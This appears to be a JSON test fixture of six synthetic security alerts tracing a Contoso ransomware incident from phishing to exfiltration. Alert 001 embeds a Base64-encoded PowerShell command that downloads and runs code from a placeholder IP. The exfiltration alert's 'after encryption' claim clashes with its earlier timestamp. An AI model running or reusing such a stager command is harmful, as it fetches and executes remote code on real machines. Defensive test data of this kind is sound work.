@@ -1,0 +1,126 @@
+[
+  {
+    "alert_id": "ALERT-2025-001",
+    "title": "Suspicious PowerShell execution with encoded command",
+    "severity": "High",
+    "description": "PowerShell.exe was observed executing a Base64-encoded command on host WKS-FIN-PC04. The decoded payload attempts to download a second-stage payload from an external IP. This pattern is consistent with Cobalt Strike stager activity.",
+    "timestamp": "2025-03-07T14:32:11Z",
+    "source": "Microsoft Defender for Endpoint",
+    "tactics": ["Execution", "Command and Control"],
+    "techniques": ["T1059.001", "T1071.001"],
+    "entities": [
+      {"entity_type": "host", "value": "WKS-FIN-PC04", "risk_score": 85, "tags": ["finance-dept"]},
+      {"entity_type": "ip", "value": "198.51.100.23", "risk_score": 92, "tags": ["known-c2", "cobalt-strike"]},
+      {"entity_type": "user", "value": "jdoe@contoso.com", "risk_score": 70, "tags": ["finance-team"]},
+      {"entity_type": "filehash", "value": "a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4e5f6a1b2", "risk_score": 95, "tags": ["cobalt-strike-beacon"]}
+    ],
+    "raw_json": {
+      "process_command_line": "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQA4AC4ANQAxAC4AMQAwADAALgAyADMAOgA4ADAAOAAwAC8AYQAnACkA",
+      "parent_process": "explorer.exe",
+      "device_id": "d-fin-04-abc123"
+    }
+  },
+  {
+    "alert_id": "ALERT-2025-002",
+    "title": "Anomalous sign-in from TOR exit node",
+    "severity": "High",
+    "description": "User jdoe@contoso.com authenticated from IP 185.220.101.42, which is a known TOR exit node. The sign-in occurred outside normal business hours and from a location inconsistent with the user's profile.",
+    "timestamp": "2025-03-07T03:18:45Z",
+    "source": "Microsoft Entra ID Protection",
+    "tactics": ["Initial Access"],
+    "techniques": ["T1078"],
+    "entities": [
+      {"entity_type": "user", "value": "jdoe@contoso.com", "risk_score": 70, "tags": ["finance-team"]},
+      {"entity_type": "ip", "value": "185.220.101.42", "risk_score": 88, "tags": ["tor-exit-node"]}
+    ],
+    "raw_json": {
+      "sign_in_id": "si-2025-abc-002",
+      "location": "Unknown / TOR",
+      "device_compliant": false,
+      "mfa_satisfied": false
+    }
+  },
+  {
+    "alert_id": "ALERT-2025-003",
+    "title": "Mass file encryption detected on network share",
+    "severity": "Critical",
+    "description": "Host WKS-FIN-PC04 performed rapid file rename operations on \\\\FILESRV01\\finance$, changing extensions to .locked. Over 1,200 files affected in 4 minutes. Pattern consistent with ransomware encryption.",
+    "timestamp": "2025-03-07T15:01:33Z",
+    "source": "Microsoft Defender for Endpoint",
+    "tactics": ["Impact"],
+    "techniques": ["T1486"],
+    "entities": [
+      {"entity_type": "host", "value": "WKS-FIN-PC04", "risk_score": 95, "tags": ["finance-dept"]},
+      {"entity_type": "host", "value": "FILESRV01", "risk_score": 80, "tags": ["file-server", "finance-share"]},
+      {"entity_type": "user", "value": "jdoe@contoso.com", "risk_score": 70, "tags": ["finance-team"]}
+    ],
+    "raw_json": {
+      "files_affected": 1247,
+      "extension_new": ".locked",
+      "share_path": "\\\\FILESRV01\\finance$",
+      "duration_seconds": 243
+    }
+  },
+  {
+    "alert_id": "ALERT-2025-004",
+    "title": "Credential harvesting phishing email detected",
+    "severity": "Medium",
+    "description": "An inbound email to jdoe@contoso.com from spoofed sender hr-benefits@contos0.com contained a link to a credential harvesting page mimicking the Contoso Entra ID login portal.",
+    "timestamp": "2025-03-07T09:45:00Z",
+    "source": "Microsoft Defender for Office 365",
+    "tactics": ["Initial Access"],
+    "techniques": ["T1566.002"],
+    "entities": [
+      {"entity_type": "user", "value": "jdoe@contoso.com", "risk_score": 70, "tags": ["finance-team"]},
+      {"entity_type": "url", "value": "https://contos0-login.evil.com/auth", "risk_score": 98, "tags": ["phishing", "credential-harvest"]},
+      {"entity_type": "domain", "value": "contos0-login.evil.com", "risk_score": 97, "tags": ["phishing-domain"]}
+    ],
+    "raw_json": {
+      "sender": "hr-benefits@contos0.com",
+      "subject": "ACTION REQUIRED: Update your benefits enrollment",
+      "message_id": "msg-2025-phish-004"
+    }
+  },
+  {
+    "alert_id": "ALERT-2025-005",
+    "title": "Lateral movement via PsExec to domain controller",
+    "severity": "Critical",
+    "description": "PsExec was used from WKS-FIN-PC04 to execute commands on DC01.contoso.local using domain admin credentials. This represents potential lateral movement toward the domain controller.",
+    "timestamp": "2025-03-07T14:55:02Z",
+    "source": "Microsoft Defender for Identity",
+    "tactics": ["Lateral Movement", "Privilege Escalation"],
+    "techniques": ["T1570", "T1078.002"],
+    "entities": [
+      {"entity_type": "host", "value": "WKS-FIN-PC04", "risk_score": 95, "tags": ["finance-dept"]},
+      {"entity_type": "host", "value": "DC01", "risk_score": 99, "tags": ["domain-controller"]},
+      {"entity_type": "user", "value": "admin-svc@contoso.com", "risk_score": 85, "tags": ["service-account", "domain-admin"]}
+    ],
+    "raw_json": {
+      "tool": "PsExec",
+      "source_host": "WKS-FIN-PC04",
+      "dest_host": "DC01.contoso.local",
+      "account_used": "CONTOSO\\admin-svc"
+    }
+  },
+  {
+    "alert_id": "ALERT-2025-006",
+    "title": "Data exfiltration to cloud storage service",
+    "severity": "High",
+    "description": "Large outbound data transfer (2.3 GB) detected from WKS-FIN-PC04 to mega.nz over HTTPS. The transfer occurred shortly after the ransomware encryption activity, suggesting double-extortion tactics.",
+    "timestamp": "2025-03-07T14:48:00Z",
+    "source": "Microsoft Defender for Cloud Apps",
+    "tactics": ["Exfiltration"],
+    "techniques": ["T1567.002"],
+    "entities": [
+      {"entity_type": "host", "value": "WKS-FIN-PC04", "risk_score": 95, "tags": ["finance-dept"]},
+      {"entity_type": "domain", "value": "mega.nz", "risk_score": 45, "tags": ["cloud-storage"]},
+      {"entity_type": "user", "value": "jdoe@contoso.com", "risk_score": 70, "tags": ["finance-team"]}
+    ],
+    "raw_json": {
+      "bytes_transferred": 2470000000,
+      "destination": "mega.nz",
+      "protocol": "HTTPS",
+      "duration_seconds": 1800
+    }
+  }
+]
